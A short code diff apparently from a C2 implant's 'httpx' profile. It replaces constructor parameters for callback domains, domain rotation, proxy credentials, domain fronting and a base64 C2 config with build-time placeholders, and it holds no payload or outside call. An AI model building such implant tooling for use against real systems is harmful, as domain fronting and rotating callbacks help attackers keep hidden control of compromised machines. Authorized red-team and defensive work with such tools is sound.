@@ -43,18 +43,18 @@ namespace Agent.Profiles
             this.messageManager = messageManager;
             
             // Parse parameters from config
-            this.callbackDomains = callback_domains;
-            this.domainRotation = domain_rotation;
-            this.failoverThreshold = failover_threshold;
-            this.timeoutSeconds = timeout;
-            this.proxyHost = proxy_host;
-            this.proxyPort = proxy_port;
-            this.proxyUser = proxy_user;
-            this.proxyPass = proxy_pass;
-            this.domainFront = domain_front;
+            this.callbackDomains = %CALLBACK_DOMAINS%;
+            this.domainRotation = "%DOMAIN_ROTATION%";
+            this.failoverThreshold = %FAILOVER_THRESHOLD%;
+            this.timeoutSeconds = %TIMEOUT%;
+            this.proxyHost = "%PROXY_HOST%";
+            this.proxyPort = %PROXY_PORT%;
+            this.proxyUser = "%PROXY_USER%";
+            this.proxyPass = "%PROXY_PASS%";
+            this.domainFront = "%DOMAIN_FRONT%";
             
             // Load malleable profile configuration
-            string rawConfig = decodeBase64Config(raw_c2_config);
+            string rawConfig = decodeBase64Config("%RAW_C2_CONFIG%");
             if (!string.IsNullOrEmpty(rawConfig))
             {
                 this.config = HttpxConfig.FromJson(rawConfig);
@@ -62,7 +62,7 @@ namespace Agent.Profiles
             }
             else
             {
-                throw new InvalidOperationException("raw_c2_config is required for httpx profile");
+                throw new InvalidOperationException("raw_c2_config is required for httpx profile. Please provide a valid JSON or TOML configuration file.");
             }
             
             // Setup HttpClient
